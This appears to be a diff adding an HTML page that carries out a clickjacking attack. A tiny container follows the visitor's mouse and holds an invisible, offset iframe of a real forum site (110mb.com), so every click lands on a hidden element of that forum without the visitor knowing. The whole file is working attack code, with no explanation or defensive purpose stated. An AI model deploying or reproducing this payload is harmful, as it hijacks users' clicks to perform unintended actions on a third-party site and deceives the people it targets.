@@ -1,0 +1,49 @@
+<style>
+#cjf {
+  width: 880px;
+  height: 2000px;
+  top: -120px;
+  left: -805px;
+  border: 0 none;
+  position: absolute;
+}
+
+#ct {
+  position: absolute;
+  width: 2px;
+  height: 2px;
+   
+  overflow: hidden;
+}
+</style>
+
+<div id="ct"><iframe id="cjf" src="http://www.110mb.com/forum/index.php"></iframe></div>
+
+<script>
+function $(e){
+	return document.getElementById(e)
+}
+
+
+function mouseX(evt) {
+  if (evt.pageX) return evt.pageX;
+  else if (evt.clientX)
+    return evt.clientX + (document.documentElement.scrollLeft ? 
+      document.documentElement.scrollLeft : document.body.scrollLeft);
+       else return 0;}
+function mouseY(evt) {
+  if (evt.pageY) return evt.pageY;
+  else if (evt.clientY)
+    return evt.clientY + (document.documentElement.scrollTop ?
+      document.documentElement.scrollTop : document.body.scrollTop);
+       else return 0;}
+
+function follow(evt) {
+  var obj = $("ct").style;
+  if (!evt) evt = window.event;
+  obj.left = (parseInt(mouseX(evt))) + 'px';
+  obj.top = (parseInt(mouseY(evt))) + 'px';
+}
+
+document.onmousemove = follow;
+</script>
